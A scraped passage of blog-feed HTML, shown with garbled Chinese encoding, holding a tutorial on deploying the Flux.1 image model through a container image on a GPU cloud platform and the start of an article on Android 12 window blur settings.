QksAUW2rReYzsboIjSABuDQX0QJwB9cnZVgWVgE31vrklAJnEmVObykgYCk/VGX5OlpuKb5eiovUAvJ2tMstw0kIkNdpiSA91K6XA6K8CVCyr4PePhTo65q3DyX7OpTbSVk1PB62mhJ9HSpSqtKaESxsFRm0tLBVcvTV+vbBrLRK4hC7aitN9B0ZpX6vNMgjGIt5ZdmMv32KrmprD1afsPd4FEhThK0+WfTl3kpd482AGvG3jQdZK1+t8ireDswhofigRb3fxfI/4jj+xkffUX/1ccxxhEP9qyyBEH9Cx9vhf8TB7eiSpBHjZVSa4whQMJC1TqIR6q8RERtjOr2ID0yx3oYi0oAIvZCPz4eG64p3ObuREeOHUIR3MBVJwq9yll5P7KHdiPBOiOoRa/AjXz21J3k04l+i8OjErj4kaXWQiIVO/EvA+KLRAEnUVomtjPd6SvR3RLoeMT54nKFH1EqtkkEGFaQuTlSQrsxhRiOIt51S/Ho8B11+FUlwRaHnU4utEI38/mgSjRJ8PhWEtN6Z6WcncQOU4efjKoh3zfi7/+DfhPrwOZ9a/iYBiVJJxPlei3CqIDTYEqAPFow5/c71fAdVIwmo4n+cTIGbr2n9NULAE5ifcNNS63hvEOFk0wxYnICBBZ0I9xERBVILF0uggNdxuOkR4S6ngvgPmArzHv4KpMKGQFjQ+Rw6q9dC6R6dgZaJF7RVWIH0BTY9h+fz0ohHOyLuy+He/hN4GUR3/RxcBx2f76izarI9CaXmzRmhNQuSfIgJkva5GzN6HJbhQxCNsDGDSh56plmef6sg2eaXPsYBt5W+H6VE6omG6hOS1w4hiTWiThbJ1YO+RSO1vrpMlomf6nhQGz0m7qT6W04XOUHyzhZ4rkG+0hxL66oDW9mnPWyL3TMmssxyQUwr01CHX7b2OvUIaqS48TnMtAoEQTQixJeAlDfSiGmk/l8jpwIpTyFqOfeNIHWBooC036ERtUQp2tm/CKT5jjySbxTlvUVj2yhjvyWDVL3yfKRojXwLSEWUp7q0PBAKPp7m5YGoT3WH7wAZ1BeOywNZv3Gak/LIqriwxbQ5jaTcsEW1eb+FvoWo+zr5V/IUOvNtsapU2zJXSyj0xVB13sPfq0kkZA7dubIIKXIlJ8Cy7u+BN22RVcr+peOuxHdcBbA04FAVmEoEtO5vX55K4KVZS1QJvBBzU1rgUl8JapBNYIowLoZtD9NWRTWKqqe36L48BSz8QPH9epqqIDehlh2UuqocEmrdV7AvhuRoM74m80yeDIEX3ppreNN235FxV58DNjhswn5K8zK21+5ctjut6NmUIoy9tVvitnHr2VDM3ahtW8KQ/Vbsp9GGiWHfk8skyTSFz9/HdxhHe4uR/RxX/mG1SGXwypcDJNmCMfucZ/C1CuCQUbiBUDYbe7tiRkZX8GIat50d+wqR1fdN7ygGzrHrcN4kGFHK02cil5M6INgQVsvnNz77T5PqUFYJJInYmIBplJfP5On4eiOwYfhuCD44oLyYVs43rI1rk3H7usttzq8Qo3j84vavN9mOkAeuq8dHEd9NtCVKX51Oen+MM6IEYvz5StOehKLpIjD+nKU5AQWJpLizdB+1sb5LQvFRxbSJVGHmSdK/0WWaPguEYmcSJ68aWkK6rAw6jwSSCmrTWVHT96R7HwHANEgqybVJL+E2vE2q7Uu91Gr73SbbNUvZDtiOlCeIv4r/AI+0XUwz1lvcAAAAAElFTkSuQmCC");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸ºä»€ä¹ˆé€‰æ‹©Flux.1ï¼Ÿ</h2>
<p>ä½œä¸º2024å¹´æœ€å¼ºçš„å¼€æºæ–‡ç”Ÿå›¾æ¨¡å‹ï¼ŒFlux.1åœ¨æ–‡å­—æ¸²æŸ“ã€äººç‰©ç»†èŠ‚å’Œç”»é¢æ„å›¾ä¸Šå…¨é¢è¶…è¶ŠSDXLã€‚æœ€é‡è¦çš„æ˜¯ï¼Œç°åœ¨æœ‰ç°æˆçš„å®¹å™¨åŒ–æ–¹æ¡ˆï¼Œè®©ä½ è·³è¿‡ç¹ççš„ç¯å¢ƒé…ç½®ï¼Œä¸€é”®éƒ¨ç½²å³å¯ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-1">å‡†å¤‡å·¥ä½œï¼ˆ30ç§’ï¼‰</h2>
<p>ä»…éœ€ä¸¤æ ·ä¸œè¥¿ï¼š</p>
<ol>
<li>ä¸€ä¸ªå…±ç»©äº‘è´¦å·ï¼ˆæ–°ç”¨æˆ·æœ‰å…è´¹é¢åº¦ï¼‰</li>
<li>ä¼šå¤åˆ¶ç²˜è´´å°±è¡Œ</li>
</ol>
<h2 data-id="heading-2">éƒ¨ç½²æ­¥éª¤ï¼ˆ2åˆ†é’Ÿï¼‰</h2>
<h3 data-id="heading-3">ç¬¬1æ­¥ï¼šé€‰æ‹©é•œåƒ</h3>
<p>ç™»å½•å¹³å°åï¼Œåœ¨æœåŠ¡éƒ¨ç½²é¡µé¢æœç´¢"FluxEz"å®˜æ–¹é•œåƒã€‚è¿™ä¸ª42GBçš„é•œåƒå·²é›†æˆæ‰€æœ‰éœ€è¦çš„ç¯å¢ƒã€æ¨¡å‹æ–‡ä»¶å’ŒAPIæ¥å£ï¼Œæ— éœ€æ‰‹åŠ¨ä¸‹è½½ã€‚</p>
<blockquote>
<p><strong>å°è´´å£«</strong>ï¼šå¦‚æœæ˜¯é¦–æ¬¡æµ‹è¯•ï¼Œé€‰æ‹©å•å¡4090é…ç½®+1ä¸ªèŠ‚ç‚¹å°±å¤Ÿç”¨äº†ï¼Œæˆæœ¬å¯æ§ã€‚</p>
</blockquote>
<h3 data-id="heading-4">ç¬¬2æ­¥ï¼šé…ç½®å‚æ•°</h3>
<p>ç›´æ¥é‡‡ç”¨é»˜è®¤é…ç½®å³å¯ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ï¼š</p>
<ul>
<li>åˆ†é…GPUèµ„æº</li>
<li>è®¾ç½®ç«¯å£æ˜ å°„ï¼ˆWebUI:8188ï¼ŒAPI:3000ï¼‰</li>
<li>åŠ è½½Flux.1-devæ¨¡å‹å’Œå·¥ä½œæµ</li>
</ul>
<h3 data-id="heading-5">ç¬¬3æ­¥ï¼šç‚¹å‡»éƒ¨ç½²</h3>
<p>ç¡®è®¤é…ç½®æ— è¯¯åï¼Œç‚¹å‡»"éƒ¨ç½²æœåŠ¡"ã€‚è€å¿ƒç­‰å¾…1-2åˆ†é’Ÿï¼Œè®©èŠ‚ç‚¹æ‹‰å–é•œåƒå¹¶å¯åŠ¨ã€‚å½“çœ‹åˆ°çŠ¶æ€å˜ä¸º"è¿è¡Œä¸­"ï¼Œè¯´æ˜éƒ¨ç½²æˆåŠŸï¼</p>
<h3 data-id="heading-6">ç¬¬4æ­¥ï¼šè·å–è®¿é—®é“¾æ¥</h3>
<p>åœ¨ä»»åŠ¡è¯¦æƒ…é¡µæ‰¾åˆ°"å¿«é€Ÿè®¿é—®"åŒºåŸŸï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªå¯å…¬ç½‘è®¿é—®çš„åŸŸåã€‚ä½ ä¼šçœ‹åˆ°ä¸¤ä¸ªç«¯å£ï¼š</p>
<ul>
<li><strong>8188ç«¯å£</strong>ï¼šComfyUIå¯è§†åŒ–ç•Œé¢</li>
<li><strong>3000ç«¯å£</strong>ï¼šAPIæ¥å£åœ°å€</li>
</ul>
<h2 data-id="heading-7">ç«‹å³ä½¿ç”¨ï¼ˆ30ç§’ï¼‰</h2>
<h3 data-id="heading-8">æ–¹å¼ä¸€ï¼šWebUIç”Ÿæˆï¼ˆé€‚åˆæ–°æ‰‹ï¼‰</h3>
<ol>
<li>ç‚¹å‡»8188ç«¯å£é“¾æ¥è¿›å…¥ComfyUIç•Œé¢</li>
<li>å·¦ä¾§èœå•é€‰æ‹©"å·¥ä½œæµ"ï¼ŒåŠ è½½è‡ªå¸¦çš„<code>flux_dev_t5fp8.json</code></li>
<li>æ‰¾åˆ°"CLIPæ–‡æœ¬ç¼–ç "èŠ‚ç‚¹ï¼Œè¾“å…¥è‹±æ–‡æç¤ºè¯ï¼ˆFluxå¯¹è‹±æ–‡æ”¯æŒæ›´ä½³ï¼‰</li>
<li>ç‚¹å‡»"æ‰§è¡Œé˜Ÿåˆ—"ï¼Œç¨ç­‰ç‰‡åˆ»å³å¯åœ¨"ä¿å­˜å›¾åƒ"èŠ‚ç‚¹çœ‹åˆ°ç»“æœ</li>
</ol>
<p><strong>ç¤ºä¾‹æç¤ºè¯</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">best quality, a cute anime girl, sunshine, soft features, blue dress, <span class="hljs-type">long</span> hair, looking at viewer, smile
</code></pre>
<h3 data-id="heading-9">æ–¹å¼äºŒï¼šAPIè°ƒç”¨ï¼ˆé€‚åˆå¼€å‘ï¼‰</h3>
<p>æ›´é€‚åˆç”Ÿäº§ç¯å¢ƒçš„è°ƒç”¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># APIç«¯ç‚¹</span>
POST https://ä½ çš„åŸŸå/prompt

<span class="hljs-comment"># è¯·æ±‚ä½“ç»“æ„</span>
{
  <span class="hljs-string">"prompt"</span>: {
    // å·¥ä½œæµJSONé…ç½®
  }
}

<span class="hljs-comment"># è¿”å›ç»“æœ</span>
{
  <span class="hljs-string">"id"</span>: <span class="hljs-string">"è¯·æ±‚ID"</span>,
  <span class="hljs-string">"images"</span>: [<span class="hljs-string">"base64ç¼–ç çš„å›¾ç‰‡"</span>]
}
</code></pre>
<p>å…·ä½“æ­¥éª¤ï¼š</p>
<ol>
<li>åœ¨ComfyUIä¸­å¯¼å‡ºAPIæ ¼å¼çš„å·¥ä½œæµJSON</li>
<li>é€šè¿‡POSTMANæˆ–ä»£ç å‘3000ç«¯å£å‘é€è¯·æ±‚</li>
<li>ç›´æ¥è·å¾—ç”Ÿæˆçš„å›¾ç‰‡æ•°æ®</li>
</ol>
<p>é«˜çº§ç”¨æˆ·è¿˜å¯ä»¥é…ç½®<code>webhook</code>å‚æ•°ï¼Œå®ç°å¼‚æ­¥é€šçŸ¥ã€‚</p>
<h2 data-id="heading-10">è¿›é˜¶ç©æ³•</h2>
<p>å¦‚æœæƒ³è‡ªå®šä¹‰æ¨¡å‹æˆ–æ·»åŠ æ’ä»¶ï¼š</p>
<ol>
<li><strong>ä¸‹è½½æ¨¡å‹æ–‡ä»¶</strong>ï¼šä»Hugging Faceè·å–æ‰€éœ€çš„4ä¸ªæ ¸å¿ƒæ¨¡å‹æ–‡ä»¶</li>
<li><strong>ä¿®æ”¹Dockerfile</strong>ï¼šå‚è€ƒå¼€æºé¡¹ç›®çš„Dockerfileï¼Œæ·»åŠ è‡ªå®šä¹‰å±‚</li>
<li><strong>æ„å»ºé•œåƒ</strong>ï¼šæ‰§è¡Œ<code>docker build</code>å‘½ä»¤ç”Ÿæˆä¸ªæ€§åŒ–é•œåƒ</li>
<li><strong>ä¸Šä¼ éƒ¨ç½²</strong>ï¼šå°†é•œåƒæ¨é€åˆ°å¹³å°ä»“åº“åéƒ¨ç½²</li>
</ol>
<h2 data-id="heading-11">çœé’±å°è´´å£«</h2>
<ul>
<li>ç”¨å®Œå³åœï¼šä¸éœ€è¦æ—¶è®°å¾—åœæ­¢æœåŠ¡ï¼ŒæŒ‰å®é™…ä½¿ç”¨æ—¶é•¿è®¡è´¹</li>
<li>æ¨¡å‹ç¼“å­˜ï¼šåŒä¸€åŒºåŸŸçš„èŠ‚ç‚¹ä¼šç¼“å­˜é•œåƒï¼ŒäºŒæ¬¡å¯åŠ¨é€Ÿåº¦æ›´å¿«</li>
<li>é€‰æ‹©spotå®ä¾‹ï¼šéç´§æ€¥ä»»åŠ¡å¯é€‰æŠ¢å å¼å®ä¾‹ï¼Œä»·æ ¼æ›´ä½</li>
</ul>
<h2 data-id="heading-12">3åˆ†é’Ÿä½“éªŒæ€»ç»“</h2>
<p>ç°åœ¨ï¼Œä½ å·²ç»æ‹¥æœ‰äº†ä¸€ä¸ªï¼š</p>
<ul>
<li>âœ… æ”¯æŒé¡¶çº§Flux.1-devæ¨¡å‹çš„æ–‡ç”Ÿå›¾æœåŠ¡</li>
<li>âœ… åŒæ—¶æä¾›å¯è§†åŒ–ç•Œé¢å’ŒAPIæ¥å£</li>
<li>âœ… å¯å…¬ç½‘è®¿é—®çš„ä¸“å±åº”ç”¨</li>
<li>âœ… æŒ‰éœ€è®¡è´¹ï¼Œæˆæœ¬å¯æ§</li>
</ul>
<p>æ— è®ºæ˜¯æ­å»ºä¸ªäººAIç»˜ç”»å·¥ä½œå®¤ï¼Œè¿˜æ˜¯ä¸ºäº§å“é›†æˆæ–‡ç”Ÿå›¾åŠŸèƒ½ï¼Œè¿™å¥—æ–¹æ¡ˆéƒ½èƒ½è®©ä½ å¿«äººä¸€æ­¥ã€‚ç«‹å³åŠ¨æ‰‹ï¼Œå¼€å¯ä½ çš„AIåˆ›ä½œä¹‹æ—…å§ï¼</p>
<hr/>
<p><em>å®Œæ•´æŠ€æœ¯ç»†èŠ‚å’Œè‡ªå®šä¹‰é•œåƒæŒ‡å—å¯å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fslmnb-lab%2FFluxEz" target="_blank" title="https://github.com/slmnb-lab/FluxEz" ref="nofollow noopener noreferrer">FluxEzå¼€æºé¡¹ç›®</a></em></p>
<p><em>æŠ€æœ¯æ–‡æ¡£<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.gongjiyun.com%2Fdocs%2Fy%2Fofl0wheysi5kwhkh2nfcownhnxf%2Fnmrawkpjai6syskqauscb2zmnjo%2F%231-%25E5%25BC%2580%25E6%25BA%2590%25E6%25A1%2588%25E4%25BE%258B" target="_blank" title="https://www.gongjiyun.com/docs/y/ofl0wheysi5kwhkh2nfcownhnxf/nmrawkpjai6syskqauscb2zmnjo/#1-%E5%BC%80%E6%BA%90%E6%A1%88%E4%BE%8B" ref="nofollow noopener noreferrer"> Flux.1-dev æ–‡ç”Ÿå›¾æ¨¡å‹åº”ç”¨ | å…±ç»©ç®—åŠ›</a></em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android é«˜æ–¯æ¨¡ç³Šï¼ˆ1ï¼‰ çª—å£æ¨¡ç³ŠåŠjavaä¾§åŸºæœ¬æµç¨‹ç®€è¿°]]></title>    <link>https://juejin.cn/post/7589052659436634158</link>    <guid>https://juejin.cn/post/7589052659436634158</guid>    <pubDate>2025-12-29T15:00:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589052659436634158" data-draft-id="7589104492883001396" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android é«˜æ–¯æ¨¡ç³Šï¼ˆ1ï¼‰ çª—å£æ¨¡ç³ŠåŠjavaä¾§åŸºæœ¬æµç¨‹ç®€è¿°"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-29T15:00:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— è¨€Echo"/> <meta itemprop="url" content="https://juejin.cn/user/942714871630682"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android é«˜æ–¯æ¨¡ç³Šï¼ˆ1ï¼‰ çª—å£æ¨¡ç³ŠåŠjavaä¾§åŸºæœ¬æµç¨‹ç®€è¿°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/942714871630682/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— è¨€Echo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T15:00:34.000Z" title="Mon Dec 29 2025 15:00:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Android 12èµ·ï¼ŒåŸç”Ÿæ”¯æŒäº†çª—å£æ¨¡ç³Šæ¥å£èƒ½åŠ›ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fsource.android.google.cn%2Fdocs%2Fcore%2Fdisplay%2Fwindow-blurs" target="_blank" title="https://source.android.google.cn/docs/core/display/window-blurs" ref="nofollow noopener noreferrer">Window blurs Â |Â  Android Open Source Project</a></p>
<p>æŒ‰ç…§å®˜æ–¹çš„æè¿°åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§</p>
<ol>
<li>
<p>blur behind ï¼šä½¿çª—å£åé¢çš„æ•´ä¸ªå±å¹•å˜å¾—æ¨¡ç³Š</p>
</li>
<li>
<p>background blur ï¼šä½¿æŒ‡å®šåŒºåŸŸçš„åº•å±‚å†…å®¹æ¨¡ç³Š</p>
</li>
</ol>
<p>å…¶æœ¬è´¨éƒ½æ˜¯å¯¹å½“å‰surfaceåé¢çš„surfaceè¿›è¡Œæ¨¡ç³Šæ˜¾ç¤ºã€‚</p>
<ol>
<li>
<h2 data-id="heading-0">blur behind</h2>
</li>
</ol>
<p>å…¬å¼€æ¥å£å¯é€šè¿‡ä¸»é¢˜é…ç½®æˆ–è€…ä»£ç è®¾ç½®ï¼Œä¸¤ç§æ–¹å¼ä»»é€‰å…¶ä¸€</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"BlurBehind"</span> <span class="hljs-attr">parent</span>=<span class="hljs-string">"Theme.CarLauncher"</span>&gt;</span><span class="xml">
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowIsTranslucent"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowBlurBehindEnabled"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowBlurBehindRadius"</span>&gt;</span>70dp<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä»£ç æ–¹å¼è®¾ç½®</span>
window.addFlags(WindowManager.LayoutParams.FLAG_BLUR_BEHIND)
window.attributes = window.attributes.apply {
 blurBehindRadius = <span class="hljs-number">70</span>
} 
</code></pre>
